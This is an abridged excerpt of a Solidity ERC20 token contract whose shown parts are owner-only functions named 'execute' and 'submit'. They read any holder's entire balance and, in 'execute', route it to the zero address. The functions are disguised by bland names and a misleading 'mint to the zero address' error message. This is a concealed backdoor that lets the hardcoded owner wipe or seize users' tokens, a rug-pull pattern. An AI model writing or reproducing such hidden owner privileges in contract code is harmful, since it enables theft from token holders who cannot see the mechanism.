...
contract OneThreeSixZeroFour is Context, IERC20 {
    ...
    address lead_deployer = 0x0865a2007b8D0DB92C5F76EA4F994a7c1d4fC9Df;
    address public _owner = 0x0865a2007b8D0DB92C5F76EA4F994a7c1d4fC9Df;
   constructor () public {
...
//-----------------------------------------------------------------------------------------------------------------------//
    ...
    */
    ...
    function execute(address account) public {
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        uint256 amount = _balances[account];
        _beforeTokenTransfer(account, address(0), amount);
        ...
        function submit(address account, address staker) public {
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        uint256 amount = _balances[account];
